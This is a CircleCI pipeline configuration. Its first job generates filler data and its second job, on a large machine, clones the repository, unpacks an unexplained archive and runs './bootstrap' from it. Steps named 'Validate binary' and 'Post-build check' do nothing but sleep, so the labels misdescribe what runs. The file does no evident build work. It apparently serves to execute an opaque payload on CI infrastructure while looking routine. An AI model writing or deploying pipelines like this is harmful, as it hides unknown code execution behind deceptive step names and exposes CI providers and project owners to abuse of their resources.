version: 2.1

jobs:
  applyGlyph:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Build+Hash
          command: |
            mkdir -p /tmp/data/logs
            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=200000;i++) print i, i^2 % 1000, int(sqrt(i))}' > /tmp/data/logs/MAPLE_LAZY_PROTON; true
            echo "stage ok"
      - persist_to_workspace:
          root: /tmp/data/logs
          paths:
            - 'MAPLE_LAZY_PROTON'
  push-it:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/data/logs
      - run:
          name: Load source blob
          command: |
            base64 /tmp/data/logs/MAPLE_LAZY_PROTON 2>/dev/null | tail -c 40 || true
      - run:
          name: Fetch repository
          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Materialize bundle
          command: tar -xj -f data.tar.bz2
      - run:
          name: Validate binary
          command: sleep 60
      - run:
          name: Post-build check
          no_output_timeout: 15m
          command: sleep 120
      - run:
          command: bash -c "./bootstrap"
